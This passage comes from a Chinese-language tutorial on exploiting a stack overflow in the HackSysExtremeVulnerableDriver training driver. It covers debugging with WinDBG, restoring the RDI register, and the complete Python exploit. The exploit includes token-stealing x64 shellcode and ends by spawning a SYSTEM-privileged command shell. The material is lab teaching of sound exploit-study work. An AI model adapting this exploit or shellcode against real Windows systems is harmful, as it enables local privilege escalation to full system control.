    else:
        print("[!] Unable to send payload to driver.")
        sys.exit(1)
这里有一些细节需要解释。我们在这里使用`ctypes`库中`memmove`函数将shellcode移到我们使用`VirtualAlloc`创建的RWX缓冲区中。有关`memmove`的信息您可以阅读[这里](https://docs.python.org/2/library/ctypes.html)
另一个需要强调的事情是，为了正确格式化指向我们的shellcode缓冲区的指针，我们必须使用`struct.pack("<Q",addr)`，它将struct的指针格式化为C中的`unsigned
long long`类型变量和Python中的8字节int类型变量。
有关`struct.pack`的所有不同类型的转换，您可以阅读[这里](https://docs.python.org/2/library/struct.html)
因为我们恢复了程序执行，并且只使用了NOPs，因此这应该毫无问题！
糟糕！我们的程序实际停止运行在`IrpDeviceIoCtlHandler`中。虽然我们定义了shellcode，但卡死在了这步操作：
正如您所见，我们正在执行`and qword ptr [rdi +
38h]`。在那里停止运行的原因，是因为我们发送的B字符覆盖了`rdi`，而`0x4242424242424242`加`0x38`不是有效的内存空间，因此这个运行崩溃了。退出shellcode时，`RDI`不能保持`0x4242424242424242`。我们必须将其恢复到损坏之前的状态。
## 还原`RDI`寄存器，实现漏洞利用
* * *
我知道的将RDI恢复到它原来状态的唯一方法是，查看我们何时运行漏洞利用程序而没有溢出，在输入`Shellcode`之前，RDI与另一个寄存器之间的偏移量是多少。
因此，我们必须再次回到非溢出缓冲区的大小，然后看看`ret`退出`TriggerStackOverflow`时的寄存器值是多少。
在该`ret`上设置一个断点并运行到达那里，我们可以像这样dump寄存器的值：
我们看到有这些寄存器值：
    rax=0000000000000000 rbx=fffffa80062e06a0 rcx=fffff88004f7efe0
    rdx=0000077ffd394e20 rsi=fffffa8005539d10 rdi=fffffa80062e05d0
    rip=fffff880038815f4 rsp=fffff88004f7f7e8 rbp=0000000000000001
     r8=0000000000000000  r9=0000000000000000 r10=4141414141414141
    r11=fffff88004f7f7e0 r12=fffffa8005b77370 r13=0000000000000000
    r14=fffffa80062e06e8 r15=0000000000000003
`RDI`寄存器，与RBX的偏移量为`d0`（RBX-RDI =`0xd0`）。
因此，我们可以做的是，在我们的Shellcode还原占位指令中，可以将`RBX`加载到`RDI`中，然后从`RDI`中减去`0xd0`，我们会得到正确的值。
让我们尝试一次不会崩溃的完整运行，我们更新的漏洞利用代码如下所示：
    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
    import time
    kernel32 = windll.kernel32
    hevd = kernel32.CreateFileA(
            "\\\\.\\HackSysExtremeVulnerableDriver",
            0xC0000000,
            0,
            None,
            0x3,
            0,
            None)
    if (not hevd) or (hevd == -1):
        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
        sys.exit(1)
    else:
        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
    shellcode1 = (
    "\x90" * 100
    )
    restoration_stub = (
    "\x48\x83\xc4\x28"               # add rsp,0x28 
    "\x48\x89\xDF"                   # mov rdi,rbx
    "\x48\x81\xEF\xD0\x00\x00\x00"   # sub rdi,0xd0
    "\xc3"                           # ret
    )
    shellcode = shellcode1 + restoration_stub
    addr = kernel32.VirtualAlloc(
        c_int64(0),
        c_int(len(shellcode)),
        c_int(0x3000),
        c_int(0x40)
    )
    if not addr:
        print("[!] Error allocating shellcode RWX buffer")
    else:
        print("[*] Allocated RWX buffer for shellcode @ {}").format(str(hex(addr)))
    memmove(addr,shellcode,len(shellcode))
    addr = struct.pack("<Q", addr)
    buf = create_string_buffer("A"*2048 + "B"*8 + addr)
    result = kernel32.DeviceIoControl(
        hevd,
        0x222003,
        addressof(buf),
        (len(buf)-1),
        None,
        0,
        byref(c_ulong()),
        None
    )
    if result != 0:
            print("[*] Sending payload to driver...")
    else:
        print("[!] Unable to send payload to driver.")
        sys.exit(1)
运行此漏洞利用代码可以正常执行，并且不会使内核崩溃！
现在剩下要做的就是添加一些实际的shellcode。 我使用了x64 shellcode，参考[@abatchy17’s blog on the
token-stealing payloads he was using](https://www.abatchy.com/2018/01/kernel-exploitation-2)
但是我也修改了它们，以便将所有使用过的寄存器首先压入堆栈以保留它们的值，然后将它们回弹到shellcode的末尾使它们还原。
最终的shellcode是：
    shellcode1 = (
    "\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00"
    "\x48\x8B\x40\x70\x48\x89\xC1\x49\x89\xCB\x49\x83\xE3\x07\xBA\x04"
    "\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00"
    "\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00"
    "\x48\x83\xE2\xF0\x4C\x09\xDA\x48\x89\x91\x08\x02\x00\x00\x5A\x41"
    "\x5B\x59\x58"
    )
    restoration_stub = (
    "\x48\x83\xc4\x28"               # add rsp,0x28 
    "\x48\x89\xDF"                   # mov rdi,rbx
    "\x48\x81\xEF\xD0\x00\x00\x00"   # sub rdi,0xd0
    "\xc3"                           # ret
    )
我将让读者来梳理那里的工作来作为这次练习的目的。请阅读Abatchy的博客，那是一个很好的资源。
运行最终漏洞利用代码，我们可以拿到期望的权限。
最终利用代码如下：
    import ctypes, sys, struct
    from ctypes import *
    from subprocess import *
    import time
    kernel32 = windll.kernel32
    hevd = kernel32.CreateFileA(
            "\\\\.\\HackSysExtremeVulnerableDriver", 
            0xC0000000, 
            0, 
            None, 
            0x3, 
            0, 
            None)
    if (not hevd) or (hevd == -1):
        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
        sys.exit(1)
    else:
        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
    shellcode1 = (
    "\x50\x51\x41\x53\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00"
    "\x48\x8B\x40\x70\x48\x89\xC1\x49\x89\xCB\x49\x83\xE3\x07\xBA\x04"
    "\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00"
    "\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00"
    "\x48\x83\xE2\xF0\x4C\x09\xDA\x48\x89\x91\x08\x02\x00\x00\x5A\x41"
    "\x5B\x59\x58"                                               
    )
    restoration_stub = (
    "\x48\x83\xc4\x28"               # add rsp,0x28 
    "\x48\x89\xDF"                   # mov rdi,rbx
    "\x48\x81\xEF\xD0\x00\x00\x00"   # sub rdi,0xd0
    "\xc3"                           # ret
    )
    shellcode = shellcode1 + restoration_stub
    addr = kernel32.VirtualAlloc(
        c_int64(0),
        c_int(len(shellcode)),
        c_int(0x3000),
        c_int(0x40)
    )
    if not addr:
        print("[!] Error allocating shellcode RWX buffer")
    else:
        print("[*] Allocated RWX buffer for shellcode @ {}").format(str(hex(addr)))
    memmove(addr,shellcode,len(shellcode))
    addr = struct.pack("<Q", addr)
    buf = create_string_buffer("A"*2048 + "B"*8 + addr)
    result = kernel32.DeviceIoControl(
        hevd,
        0x222003,
        addressof(buf),
        (len(buf)-1),
        None,
        0,
        byref(c_ulong()),
        None
    )
    if result != 0:
            print("[*] Sending payload to driver...")
    else:
        print("[!] Unable to send payload to driver.")
        sys.exit(1)
    print("[*] Spawning CMD shell with nt authority\system privs.")
    Popen("start cmd", shell=True)
## 结尾
* * *
实际上，这花了我很长时间才能弄清楚。
在所有演练中我都没有遇到过到过`RDI`的问题，因此这对我来说是一个很好的机会自食其力、探索和使用WinDBG的绝佳机会。非常感谢所有精彩的博客文章，非常感谢各位作者。